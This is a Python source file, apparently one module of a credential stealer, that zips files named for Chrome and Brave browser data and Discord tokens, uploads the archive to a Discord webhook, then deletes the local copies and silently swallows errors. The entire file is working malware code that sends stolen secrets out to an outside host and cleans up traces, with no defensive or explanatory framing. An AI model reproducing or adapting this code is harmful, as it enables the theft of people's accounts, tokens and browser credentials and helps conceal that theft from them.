from discord_webhook import DiscordWebhook
from zipfile import ZipFile
from constants import MY_HOME
import os


class Extract(object):
    def __init__(self) -> None:
        self.webhook_url = "webhookurl"
        self.chrome = MY_HOME + 'chrome.txt'
        self.discord = MY_HOME+'dtokens.txt'
        self.brave = MY_HOME+'brave.txt'
        self.zip_files()
        self.send_data(self.webhook_url)
        self.remove_data()

    def zip_files(self):
        with ZipFile(MY_HOME + "extraction.zip", "w") as zip_obj:
            try:
                zip_obj.write(self.chrome)
            except FileNotFoundError:
                pass
            try:
                zip_obj.write(self.discord)
            except FileNotFoundError:
                pass
            try:
                zip_obj.write(self.brave)
            except FileNotFoundError:
                pass

            zip_obj.close()

    def send_data(self, webhook_url):
        try:
            webhook = DiscordWebhook(
                url=webhook_url, username="webhook with files",  rate_limit_retry=True)
            with open(MY_HOME+"extraction.zip", "rb") as f:
                webhook.add_file(file=f.read(), filename="extraction.zip")
            resp = webhook.execute()
        except:
            pass

    def remove_data(self):
        if os.path.exists(self.chrome):
            os.remove(self.chrome)
        if os.path.exists(self.discord):
            os.remove(self.discord)
        if os.path.exists(self.brave):
            os.remove(self.brave)
